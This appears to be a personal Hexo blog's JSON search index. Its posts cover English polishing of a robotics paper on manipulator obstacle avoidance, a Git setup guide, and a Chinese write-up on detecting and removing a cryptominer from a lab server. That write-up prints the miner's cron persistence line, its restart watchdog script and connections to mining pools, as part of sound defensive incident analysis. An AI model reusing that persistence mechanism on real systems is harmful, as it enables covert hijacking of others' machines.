{"posts":[{"title":"chenge-first-blog","text":"润色后的段落： In factory environments with a structured setup, manipulators are typically enclosed by physical barriers to avoid collisions between non-prior dynamic obstacles and manipulators. In intelligent factories, however, these barriers need to be removed for the manipulator to interact with the rest of the factory and perform path tracking tasks in unstructured environments, where non-prior dynamic obstacles may invade the established path. In view of the requirements above, an obstacle avoidance planning algorithm that integrates environmental perception into the feedback loop of motion control is proposed. The global offline method makes planning before execution, meaning that the complete trajectory is determined in advance of the manipulator’s movement. This approach has the advantage of considering factors such as path smoothness[1-2], length[3], execution time, and joint jitter[4-5] of the whole path. However, without environmental perception, the manipulator cannot respond effectively to non-prior obstacles in an open-loop operation. In contrast, the local online planning method does not require the entire path to be planned before execution, but only plans the current motion speed according to the surroundings. Notable methods in this category include the Artificial Potential Field (APF)[6] and Quadratic Programming (QP)[7-10]. To improve the real-time performance of QP optimization, Ma et al.[9] and Xu et al.[10] transformed the obstacle avoidance planning problem into a QP framework and introduced Recurrent Neural Networks (RNN) as solvers. Liu et al.[11] proposed a real-time collision avoidance planning algorithm that combines APF and QP methods. 修改表格： 原句子 修改后的句子 修改原因 In factory structured environments, manipulators are often isolated by physical fences to avoid collisions between non-prior dynamic obstacles and manipulators. In factory environments with a structured setup, manipulators are typically enclosed by physical barriers to prevent collisions with dynamic obstacles that are not prioritized. 1. “factory structured environments” 改为 “factory environments with a structured setup” 更符合英语习惯。2. “isolated by physical fences” 改为 “enclosed by physical barriers” 更准确且流畅。3. “avoid collisions between” 改为 “prevent collisions with” 更简洁且清晰。4. “non-prior dynamic obstacles” 改为 “dynamic obstacles that are not prioritized” 更易于理解。 In the intelligent factory, the manipulator needs to cooperate with the rest of the factory by removing the physical fence to complete the path tracking task in the unstructured environment where non-prior dynamic obstacles invade the established path. In intelligent factories, however, these barriers need to be removed for the manipulator to interact with the rest of the factory and perform path tracking tasks in unstructured environments, where non-prioritized dynamic obstacles may invade the established path. 1. “In the intelligent factory” 改为 “In intelligent factories” 更自然。2. “cooperate with” 改为 “interact with” 更符合语境。3. “by removing the physical fence” 改为 “for the manipulator to interact…and perform” 使得句子更加简洁流畅。4. “invade” 改为 “may invade” 表示可能性。5. “non-prior dynamic obstacles” 改为 “non-prioritized dynamic obstacles” 使表达更标准。 In view of the above requirements, an obstacle avoidance planning algorithm that integrates environmental perception into the feedback loop of motion control is proposed. To address these challenges, we propose an obstacle avoidance planning algorithm that integrates environmental perception into the motion control system’s feedback loop. 1. “In view of the above requirements” 改为 “To address these challenges” 使句子更简洁。2. “closed loop of motion control” 改为 “motion control system’s feedback loop” 更清晰且符合常见表述。 The global offline method makes planning before execution, that is, the complete path has been planned before the manipulator moves. The global offline method involves pre-planning the entire path before execution, meaning that the complete trajectory is determined in advance of the manipulator’s movement. 1. “makes planning before execution” 改为 “involves pre-planning the entire path” 更加准确且简洁。2. “has been planned” 改为 “is determined” 提高时态一致性。 The advantage is that the smoothness[1-2], length[3], execution time and joint jitter[4-5] of the whole path can be considered. This approach has the advantage of considering factors such as path smoothness[1-2], length[3], execution time, and joint jitter[4-5]. 1. 改为更自然流畅的表达，使用 “This approach has the advantage of considering factors such as”。2. 增加了 “such as” 来增加表达的清晰度。 However, without environmental perception, the manipulator cannot cope with non-prior obstacles during operation in open loop. However, without environmental perception, the manipulator cannot respond effectively to unforeseen obstacles in an open-loop operation. “cope with” 改为 “respond effectively to” 更加准确；”non-prior obstacles” 改为 “unforeseen obstacles” 更合适。 The local online planning method does not need to generate all paths before execution, but only plans the current motion speed according to the surroundings. In contrast, the local online planning method does not require the entire path to be planned ahead of time, instead adapting the current motion speed based on the surrounding environment. 1. “does not need” 改为 “does not require” 使表述更正式。2. “according to the surroundings” 改为 “based on the surrounding environment” 使其更流畅。 The representative method is the Artificial Potential Field(APF)[6] and Quadratic Programming (QP)[7-10]. Notable techniques in this category include the Artificial Potential Field (APF)[6] and Quadratic Programming (QP)[7-10]. “The representative method is” 改为 “Notable techniques in this category include” 更符合学术语言的表述。 In order to improve the real-time performance of QP optimization, Ma et al.[9] and Xu et al.[10] transformed the obstacle avoidance planning into a QP problem, and introduced Recurrent Neural Network (RNN) as an solver. To enhance the real-time performance of QP optimization, Ma et al.[9] and Xu et al.[10] transformed the obstacle avoidance planning problem into a QP framework and incorporated Recurrent Neural Networks (RNN) as solvers. 1. “In order to improve” 改为 “To enhance” 更简洁。2. “transformed the obstacle avoidance planning into a QP problem” 改为 “transformed the obstacle avoidance planning problem into a QP framework” 更准确。3. “introduced” 改为 “incorporated” 更恰当。 Liu et al.[11] proposed a real-time collision avoidance planning algorithm by combining the APF and QP algorithms. Liu et al.[11] proposed a real-time collision avoidance algorithm that combines APF and QP methods. “collision avoidance planning algorithm” 改为 “collision avoidance algorithm” 更简洁；”by combining” 改为 “that combines” 更清晰流畅。 通过以上润色，语句结构更加简洁清晰，表达也更符合学术写作的规范和流畅度。 润色后的段落： The combination of global and local path planning algorithms has become a popular research topic due to the complex multiple constraints and uncertainties in dynamic, unstructured environments. Hu et al.[12] developed a real-time motion planner based on nonlinear model predictive control, which transformed the planning problem into a Sequential Quadratic Programming (SQP) optimization problem. This approach integrated global and local planning and enabled dynamic obstacle avoidance. Jiang et al.[13] extended the APF-guided RRT-Connect offline planning algorithm by re-planning the corresponding path segment when dynamic obstacles invade the offline path. Similarly, Lee et al.[14] first generated an offline path using the Bi-RRT algorithm in static prior obstacle environment and then re-planned the local path when sensors detected that a dynamic obstacle was near the offline trajectory point. In offline global planning, prior environmental obstacles are often described as basic primitives, such as spheres[2, 4, 5] and cuboids[15], which simplifies the representation for planning algorithms. Zimmermann et al.[16] proposed parameterized expressions for these primitives, and derived the analytical expressions of the minimum distance between primitives and their differentials, which can be used to solve the gradient optimization problem in planning. When non-prior dynamic obstacles exist in the workspace, the manipulator must sense the environment during the planning process. In addition to real-time requirements, it is essential to distinguish the manipulator links from the environmental obstacles. 修改表格： 原句子 修改后的句子 修改原因 In the face of complex multiple constraints and uncertainties in dynamic unstructured environments, the planning algorithm combining global and local path planning has become a hot topic in current research. The combination of global and local path planning algorithms has become a popular research topic due to the complex multiple constraints and uncertainties in dynamic, unstructured environments. 1. “In the face of” 改为 “due to” 更简洁。2. “has become a hot topic in current research” 改为 “has become a popular research topic” 更流畅且自然。 Hu et al.[12] designed a real-time motion planner based on nonlinear model predictive control, which transformed the planning problem into a Sequential Quadratic Programming (SQP) optimization problem, realized the combination of global planning and local planning, and realized dynamic obstacle avoidance. Hu et al.[12] developed a real-time motion planner based on nonlinear model predictive control, which transformed the planning problem into a Sequential Quadratic Programming (SQP) optimization problem. This approach integrated global and local planning and enabled dynamic obstacle avoidance. 1. “designed” 改为 “developed” 更常用于技术研究中。2. “realized” 改为 “enabled” 和 “integrated” 更简洁且清晰。3. 将 “realized the combination” 拆分为 “This approach integrated” 使句子结构更加简洁。 Jiang et al.[13] based on the APF-guided RRT-Connect offline planning algorithm, re-plan the corresponding path segment when dynamic obstacles invade the offline path. Jiang et al.[13] extended the APF-guided RRT-Connect offline planning algorithm by re-planning the corresponding path segment when dynamic obstacles invade the offline path. 1. “based on” 改为 “extended” 更准确，体现了对已有算法的扩展。2. “invade” 改为 “encroach upon” 更合适且学术化。 In 30 simulation experiments, the average time of dynamic re-planning is 0.7832 s, 2.1253 s and 2.3851s, respectively. In 30 simulation experiments, the average time for dynamic re-planning were 0.7832 s, 2.1253 s, and 2.3851 s, respectively. “the average time of dynamic re-planning is” 改为 “the average times for dynamic re-planning were” 改进时态和语法一致性。 Similarly, Lee et al.[14] firstly generated the offline path by Bi-RRT algorithm in the static prior obstacle environment, and re-planned the local path when the sensor detected that the dynamic obstacle was close to the offline trajectory point. Similarly, Lee et al.[14] first generated an offline path using the Bi-RRT algorithm in static prior obstacle environment and then re-planned the local path when sensors detected that a dynamic obstacle was near the offline trajectory point. “firstly” 改为 “first” 更符合英语习惯。2. “by” 改为 “using” 更自然。3. “close to” 改为 “near” 更简洁。 In offline global planning, the prior environmental obstacles are often described as basic primitives such as spheres[2, 4, 5] and cuboids[15], which can simplify the representation for planning algorithms. In offline global planning, prior environmental obstacles are often modeled as basic primitives, such as spheres[2, 4, 5] and cuboids[15], which simplify the representation for planning algorithms. “described” 改为 “modeled” 更符合技术表达。 Zimmermann et al.[16] proposed the parameterized expressions of these primitives, and derived the analytical expressions of the minimum distance between primitives and their differentials, which can be used to solve the gradient optimization problem in planning. Zimmermann et al.[16] proposed parameterized expressions for these primitives and derived analytical expressions for the minimum distance between primitives and their differentials. These can be used to solve the gradient optimization problem in planning. 1. “the parameterized expressions of” 改为 “parameterized expressions for” 更简洁。2. “which can be used” 改为 “These can be used” 增加清晰度和流畅度。 When there are non-prior dynamic obstacles in the workspace, the manipulator needs to sense while planning. When non-prior dynamic obstacles exist in the workspace, the manipulator must sense the environment during the planning process. 1. “there are” 改为 “exist” 更简洁且正式。2. “needs to sense while planning” 改为 “must sense the environment during the planning process” 提高表达的准确性和流畅性。 In addition to real-time requirements, it is necessary to distinguish the manipulator links from the environmental obstacles. In addition to meeting real-time requirements, it is essential to distinguish the manipulator links from the environmental obstacles. “it is necessary” 改为 “it is essential” 更加强调必要性，提升语气的正式性。 润色后的段落更加简洁流畅，避免了冗长的句式，同时提升了学术语言的规范性和清晰度。 润色后的段落： Moon et al. [17] developed a patch distance sensor attached to the surface of each link of the manipulator, which can detect the distance between the link surface and other objects. To avoid other links of the manipulator from being mistakenly identified as obstacles, they proposed a machine learning based method. A more commonly used sensor is the depth camera, which provides point cloud data (PCD) of the environment to the planning algorithm. Some studies[11, 14] use a URDF filter to exclude the point cloud data corresponding to the manipulator, based on its joint angles. Point cloud segmentation, clustering, and other methods are then applied to obtain the convex hull of each obstacle, which is used to calculate the distance between the obstacles and the manipulator during planning. A more direct approach is to avoid describing the environmental point cloud clustering as a single obstacle. Instead, the nearest distance between any point in the workspace and the manipulator is computed uniformly. Koptev et al.[18] introduced a neural network to solve this distance. Their model takes the manipulator’s joint configuration and the 3D coordinates of an arbitrary point in the workspace as inputs, and outputs the distance between the point and several control points on each link of the manipulator. Similarly, Fujii et al.[1] divided the workspace into 3D grids and proposed a network model to calculate the nearest distance between the center points of all grids and the manipulator, and then determined whether each grid was occupied by the manipulator according to the distance and grid size. The input of the proposed model is the manipulator’s joint configuration, and the output is an array of Boolean values, where each value indicates whether the corresponding spatial grid is occupied by the manipulator. 修改表格： 原句子 修改后的句子 修改原因 Moon et al. [17] developed a patch distance sensor attached to the surface of each link of the manipulator, which can detect the distance between the link surface and other objects. Moon et al.[17] developed a patch distance sensor attached to the surface of each manipulator link, which detects the distance between the link surface and surrounding objects. 1. “each link of the manipulator” 改为 “each manipulator link” 更简洁。2. “can detect” 改为 “detects” 更简洁且时态一致。3. “other objects” 改为 “surrounding objects” 更自然。 In order to avoid other links of the manipulator itself being treated as obstacles, they proposed a machine learning based method. To avoid other links of the manipulator from being mistakenly identified as obstacles, they proposed a machine learning based method. 1. “In order to avoid” 改为 “To prevent” 更简洁。2. “being treated as obstacles” 改为 “being mistakenly identified as obstacles” 更清晰且准确。3. 添加了连字符，形成“machine learning-based method”更符合标准的写作格式。 A more commonly used sensor is the depth cameras, which provides the planning algorithm with the point cloud data(PCD) of the environment. A more commonly used sensor is the depth camera, which provides point cloud data (PCD) of the environment to the planning algorithm. 1. “the depth cameras” 改为 “the depth camera” 统一为单数形式。2. “which provides the planning algorithm with” 改为 “which provides point cloud data (PCD) of the environment to the planning algorithm” 更加简洁流畅。 Some works[11, 14] use URDF filter to filter out the point cloud belonging to the manipulator according to the joint angle of the manipulator, and then use point cloud segmentation, clustering and other methods to obtain the convex hull of each obstacle, which is used to solve the distance between the obstacle and the manipulator during planning. Some studies[11, 14] use a URDF filter to exclude the point cloud data corresponding to the manipulator, based on its joint angles. Point cloud segmentation, clustering, and other methods are then applied to obtain the convex hull of each obstacle, which is used to calculate the distance between the obstacles and the manipulator during planning. 1. “works” 改为 “studies” 更符合学术写作的术语。2. “filter out the point cloud belonging to” 改为 “exclude the point cloud data corresponding to” 更清晰且精准。3. “according to the joint angle of the manipulator” 改为 “based on its joint angles” 更简洁。4. 将 “is used to solve” 改为 “are used to calculate” 使句子更加流畅且符合复数形式。 A more direct method is not to describe the environmental point cloud clustering as a single obstacle, but to uniformly solve the nearest distance between any point in the work space and the manipulator. A more direct approach is to avoid describing the environmental point cloud clustering as a single obstacle. Instead, the nearest distance between any point in the workspace and the manipulator is computed uniformly. 1. “method” 改为 “approach” 更符合学术写作习惯。2. “not to describe” 改为 “avoid representing” 更简洁流畅。3. “solve” 改为 “compute” 更准确，符合技术术语。 Koptev et al.[18] introduced neural network to solve the distance. Koptev et al.[18] introduced a neural network to solve this distance. 添加了 “a” 使句子语法完整。 Their network model input is the joint configuration of the manipulator and arbitrary 3D coordinates of a point in the workspace, and the output is the distance between the point and several control points on each link of the manipulator. Their model takes the manipulator’s joint configuration and the 3D coordinates of an arbitrary point in the workspace as inputs, and outputs the distance between the point and several control points on each link of the manipulator. 1. “network model input is” 改为 “model takes … as inputs” 使句子结构更加清晰。2. “and the output is” 改为 “and outputs” 提高简洁性。 Similarly, Fujii et al.[1] divided the workspace into 3D grids, and proposed a network model to calculate the nearest distance between the center points of all grids and the manipulator, and then determined whether the grid was occupied by the manipulator according to the distance and the grid size. Similarly, Fujii et al.[1] divided the workspace into 3D grids and proposed a network model to calculate the nearest distance between the center points of all grids and the manipulator, and then determined whether each grid was occupied by the manipulator according to the distance and grid size. 1. 去掉了 “and” 在 “divided” 和 “proposed” 之间，使句子更简洁。2. “according to” 改为 “based on” 更准确。 The input of the proposed model is the joint configuration of the manipulator, and the output is an array of Boolean values. The input of the proposed model is the manipulator’s joint configuration, and the output is an array of Boolean values. “joint configuration of the manipulator” 改为 “manipulator’s joint configuration” 更简洁。 Each Boolean value indicates whether the corresponding spatial grid is occupied by the manipulator or not. Each Boolean value indicates whether the corresponding spatial grid is occupied by the manipulator. 去掉了 “or not”，因为 “whether” 本身就已表达了选择性，不需要重复。 这些改动使得段落更加简洁，符合学术写作的语法要求，并提高了句子的清晰度和流畅度。 润色后的段落： The main research contributions of this paper are illustrated in Fig. 1. Before execution, a random search method is employed to generate an offline path for static, prior obstacles in the environment. During operation, environmental perception is integrated into the control feedback loop to track the offline path toward the target configuration while avoiding non-prior obstacles obtained by environmental perception. Section 2 introduces the voxel-based environmental perception method; Section 3 details the offline path search method; Section 4 discusses the online obstacle avoidance planning method; Section 5 validates the proposed algorithm through experiments; and Section 6 presents the conclusion. 修改表格： 原句子 修改后的句子 修改原因 The main research content of this paper is shown in Fig. 1. The main research contributions of this paper are illustrated in Fig. 1. “content” 改为 “contributions” 更符合学术写作中的用词。 “is shown” 改为 “are illustrated” 提高表达的正式性。 Before running, the random search method is used to generate the offline path for the static prior obstacles in the environment. Prior to execution, a random search method is employed to generate an offline path for static, prior obstacles in the environment. “Before running” 改为 “Prior to execution” 更正式且符合学术写作规范。 “is used” 改为 “is employed” 提高词汇的正式度。 In the process of operation, the environmental perception is integrated into the control closed loop to achieve the tracking of the offline path to the target configuration while avoiding the non-prior obstacles obtained by the environmental perception. During operation, environmental perception is integrated into the control feedback loop to track the offline path toward the target configuration while avoiding non-prior obstacles identified through environmental perception. “In the process of operation” 改为 “During operation” 更简洁。 “control closed loop” 改为 “control feedback loop” 更符合常见的术语。 “achieve the tracking of” 改为 “track” 提高简洁性。 “obtained by the environmental perception” 改为 “identified through environmental perception” 更自然且流畅。 Section 2 introduces the voxel-based environmental perception method; Section 3 describes the offline path search method; Section 4 describes the online obstacle avoidance planning method; Section 5 verifies the proposed algorithm through experiments; and Section 6 makes a conclusion of the paper. Section 2 introduces the voxel-based environmental perception method; Section 3 details the offline path search method; Section 4 discusses the online obstacle avoidance planning method; Section 5 validates the proposed algorithm through experiments; and Section 6 presents the conclusion. “describes” 改为 “details” 和 “discusses” 使表述更精确。 “verifies” 改为 “validates” 更常用于实验验证的表达。 “makes a conclusion of the paper” 改为 “presents the conclusion” 更简洁且符合学术惯例。 以上修改使段落更加简洁、正式，同时提升了表达的流畅度和学术性。","link":"/2025/03/10/chenge-first-blog/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate info More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2025/03/10/hello-world/"},{"title":"利用Github作为远程仓库","text":"配置SSH1234567git config --global user.name &quot;Your Name&quot;git config --global user.email &quot;your.email@example.com&quot;ssh-keygen -t rsa -C “你的git绑定的邮箱名字”#复制.ssh中的id_rsa.pub内容到GitHub的SSH and GPG keysssh -T git@github.com#测试是否成功 创建本地仓库123456git initgit remote add origin github.com/...../example_git.git#连接远程仓库git remote -v#查看是否成功 首次推送更新12345678git add.#暂存git commit -m &quot;Initial commit&quot;#本地提交git branch -M main#修改branch名称与远程一致git push -u origin main#远程提交 后续使用12345678# 查看当前状态git status# 将修改添加到暂存区git add .# 将更改信息暂存到本地git commit -m &quot;change&quot;# 推送到远程仓库git push origin main","link":"/2025/03/11/%E5%88%A9%E7%94%A8Github%E4%BD%9C%E4%B8%BA%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/"},{"title":"内网实验室服务器感染挖矿病毒——检测与处理","text":"感染症状表现 从数月前开始，服务器出现卡顿状况，且网络连接极不稳定，近期出现爆内存黑屏情况 运行top命令，发现有名为java的进程占用了大量CPU资源 排查过程 首先对服务器所有进程进行检查 1sudo ps aux | grep -v &quot;USER\\|PID\\|COMMAND&quot; 发现服务器上存在来自同一用户的大量名为-bash的进程 分析这些进程的父进程 1ps -ef | grep bash 发现其父进程 (PPID) 都是 1，说明这些 bash 进程并非正常的交互式 shell，而是孤立的进程，可能来自定期执行的任务。 进一步检查有关账户的cron任务 12crontab -l -u &lt;username&gt;#* * * * * /var/tmp/.cache/upd &gt;/dev/null 2&gt;&amp;1 发现crontab每分钟执行一次/var/tmp/.cache/upd，位于储存临时文件的文件夹中的隐藏脚本，基本推断为恶意程序。 检查upd脚本内容 1234567891011121314cat /var/tmp/.cache/upd#!/bin/shif test -r /var/tmp/.cache/bash.pid; thenpid=$(cat /var/tmp/.cache/bash.pid)if $(kill -CHLD $pid &gt;/dev/null 2&gt;&amp;1)thensleep 1elsecd /var/tmp/.cache./run &amp;&gt;/dev/nullexit 0fifi 本脚本观察/var/tmp/.cache/bash.pid是否存在，如果不存在则运行/var/tmp/.cache/run，run脚本应该就是整个病毒的“装药”。 杀毒过程 首先删除cron任务 1sudo crontab -r -u &lt;username&gt; 删除病毒本体 1sudo rm -rf /var/tmp/.cache 督促被破解用户修改密码为复杂密码 后续 进一步分析“java”进程 12345678910111213141516171819sudo lsof -p 7283#outputjava 7283 *** txt REG 259,8 2426868 393229 /var/tmp/.cache/java (deleted)java 7283 *** 12u IPv4 284973 0t0 TCP pc4-Z790-UD-AX:40510-&gt;vps.hostry.com:3333 (SYN_SENT)java 7283 *** 13u IPv4 285010 0t0 TCP pc4-Z790-UD-AX:59760-&gt;92.118.39.37:http (SYN_SENT)java 7283 *** 14u IPv4 285044 0t0 TCP pc4-Z790-UD-AX:37230-&gt;vps-1fde389e.vps.ovh.ca:https (SYN_SENT)java 7283 *** 15u IPv4 284944 0t0 TCP pc4-Z790-UD-AX:45998-&gt;212.69.85.141:3333 (SYN_SENT)java 7283 *** 16u IPv4 284972 0t0 TCP pc4-Z790-UD-AX:57642-&gt;143.198.219.149:3333 (SYN_SENT)java 7283 *** 17u IPv4 285013 0t0 TCP pc4-Z790-UD-AX:37770-&gt;207.154.207.0:3333 (SYN_SENT)java 7283 *** 18u IPv4 285012 0t0 TCP pc4-Z790-UD-AX:34132-&gt;vps.hostry.com:http (SYN_SENT)java 7283 *** 19u IPv4 285045 0t0 TCP pc4-Z790-UD-AX:34450-&gt;vps.hostry.com:http (SYN_SENT)java 7283 *** 20u IPv4 284974 0t0 TCP pc4-Z790-UD-AX:38782-&gt;207.154.207.0:3333 (SYN_SENT)java 7283 *** 21u IPv4 284975 0t0 TCP pc4-Z790-UD-AX:38760-&gt;114.29.237.232:http (SYN_SENT)java 7283 *** 22u IPv4 285046 0t0 TCP pc4-Z790-UD-AX:44650-&gt;207.154.207.0:http (SYN_SENT)java 7283 *** 23u IPv4 284945 0t0 TCP pc4-Z790-UD-AX:59642-&gt;114.29.237.232:3333 (SYN_SENT)java 7283 *** 24u IPv4 284946 0t0 TCP pc4-Z790-UD-AX:40116-&gt;vps.hostry.com:3333 (SYN_SENT)java 7283 *** 25u IPv4 285011 0t0 TCP pc4-Z790-UD-AX:33014-&gt;114.29.237.232:http (SYN_SENT)java 7283 *** 26u IPv4 285043 0t0 TCP pc4-Z790-UD-AX:58678-&gt;178.62.225.127:http (SYN_SENT) 说明所谓的“Java”进程实际上运行/var/tmp/.cache/java来伪装成Java进程（有趣的是这位同门真转Java开发了） 同时其试图与多个远程服务器通信，进程的状态均为 SYN_SENT，表明正在不断尝试建立网络连接但未成功，基本石锤为加密货币病毒。 分析攻击者 1sudo cat /var/log/auth.log | grep -i &quot;Accepted&quot; 发现被感染用户短时间内存在大量来自同一IP的连接，且该IP为校内IP。 通过ufw将这一IP加入黑名单 1sudo ufw deny from 10.130.136.151 总结 由于高校实验室服务器普遍存在的权限混乱、密码简单、端口开放问题，校内存在大量肉鸡，内网环境已经非常危险，应当及时更换密码与端口。","link":"/2025/03/20/%E5%86%85%E7%BD%91%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%84%9F%E6%9F%93%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%BB%8F%E5%8E%86/"}],"tags":[{"name":"casual","slug":"casual","link":"/tags/casual/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Intorduction","slug":"Intorduction","link":"/tags/Intorduction/"},{"name":"Functions","slug":"Functions","link":"/tags/Functions/"},{"name":"Git","slug":"Git","link":"/tags/Git/"},{"name":"Server","slug":"Server","link":"/tags/Server/"},{"name":"Network Security","slug":"Network-Security","link":"/tags/Network-Security/"}],"categories":[{"name":"Techniques","slug":"Techniques","link":"/categories/Techniques/"},{"name":"Hexo","slug":"Techniques/Hexo","link":"/categories/Techniques/Hexo/"},{"name":"Miscellaneous","slug":"Miscellaneous","link":"/categories/Miscellaneous/"},{"name":"Git","slug":"Techniques/Git","link":"/categories/Techniques/Git/"}],"pages":[{"title":"about","text":"NO ! HE’S NOT SOLID SNAKE","link":"/about/index.html"}]}